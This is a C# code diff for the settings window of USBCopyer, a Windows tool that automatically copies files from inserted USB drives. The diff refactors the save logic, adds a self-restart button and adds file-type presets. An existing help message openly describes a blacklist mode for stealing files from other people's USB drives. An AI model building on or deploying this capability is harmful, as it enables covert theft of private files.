@@ -69,7 +69,7 @@ namespace USBCopyer
             host.openBlog();
         }
 
-        private void saveButton_Click(object sender, EventArgs e)
+        protected void Save_Config()
         {
             try
             {
@@ -110,7 +110,7 @@ namespace USBCopyer
                     {
                         Directory.CreateDirectory(Properties.Settings.Default.dir);
                     }
-                   Host.dir = Properties.Settings.Default.dir + "\\";
+                    Host.dir = Properties.Settings.Default.dir + "\\";
                 }
 
                 Properties.Settings.Default.SkipDVD = SkipDVD.Checked;
@@ -126,10 +126,15 @@ namespace USBCopyer
                 else if (DiskModeWhite.Checked) Properties.Settings.Default.UseBlackDisk = false;
                 Properties.Settings.Default.Save();
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 MessageBox.Show(ex.Message, "保存设置失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
+        }
+
+        private void saveButton_Click(object sender, EventArgs e)
+        {
+            Save_Config();
         }
 
         private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
@@ -226,36 +231,6 @@ namespace USBCopyer
             (new donateForm()).Show();
         }
 
-        private void label2_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label11_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void label17_Click(object sender, EventArgs e)
-        {
-
-        }
-
-        private void filesizetype_SelectedIndexChanged(object sender, EventArgs e)
-        {
-
-        }
-
-        private void sleep_TextChanged(object sender, EventArgs e)
-        {
-
-        }
-
-        private void filesize_TextChanged(object sender, EventArgs e)
-        {
-
-        }
-
         private void linkLabel7_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
             MessageBox.Show("当你要把USBCopyer用作自动备份特定U盘的工具，请使用白名单模式\r\n白名单模式下，只有预先设置好的U盘才会被USBCopyer复制\r\n\r\n当你要把USBCopyer用作偷U盘文件的工具，请使用黑名单模式\r\n黑名单模式下，USBCopyer会复制除预先设置好的U盘以外的全部U盘\r\n\r\n另外，分区号和序列号是“或”的关系，只要有一者符合即命中","黑白名单模式帮助",MessageBoxButtons.OK,MessageBoxIcon.Information);
@@ -280,6 +255,46 @@ namespace USBCopyer
             catch (Exception ex)
             {
                 MessageBox.Show("打开失败：" + ex.ToString());
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            Save_Config();
+            try
+            {
+                Process.Start("cmd.exe", "/c title Restarting USBCopyer && echo Killing USBCopyer && taskkill /f /pid " + Process.GetCurrentProcess().Id + " && echo Starting USBCopyer && start \"\" \"" + Application.ExecutablePath + "\"");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("快速重启失败:\r\n" + ex.Message);
+            }
+        }
+
+        protected void Set_type(string x)
+        {
+            black.Text = white.Text = x;
+        }
+
+        private void cb_type_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            switch (cb_type.SelectedIndex)
+            {
+                case 1:
+                    Set_type("doc,docx,pdf");
+                    break;
+                case 2:
+                    Set_type("mp4,mkv,avi");
+                    break;
+                case 3:
+                    Set_type("zip,rar,7z");
+                    break;
+                case 4:
+                    Set_type("png,jpg,bmp");
+                    break;
+                default:
+                    Set_type("");
+                    break;
             }
         }
     }
